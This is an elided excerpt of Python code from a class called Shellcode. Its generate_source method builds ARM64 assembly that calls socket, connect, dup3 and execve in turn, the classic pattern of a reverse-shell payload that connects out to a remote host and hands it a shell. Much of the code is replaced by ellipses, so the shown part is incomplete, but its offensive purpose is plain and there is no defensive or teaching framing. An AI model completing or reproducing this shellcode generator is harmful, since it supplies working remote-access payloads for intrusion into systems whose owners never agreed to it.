...
class Shellcode():
    ...
    def generate_source(self):
        ...
        source_code += f"        mov x8, #{self.syscalls['socket']} // socket syscall\n"
        ...
        source_code += f"        mov x8, #{self.syscalls['connect']} // connect syscall\n"
        ...
        source_code += "        mov x2, #0\n"
        source_code += f"        mov x8, #{self.syscalls['dup3']} // dup3 syscall\n"
        source_code += "        svc #1337\n"
        ...
        source_code += "        mov x2, #0\n"
        source_code += f"        mov x8, #{self.syscalls['execve']} // execve syscall\n"
        source_code += "        svc #1337\n"
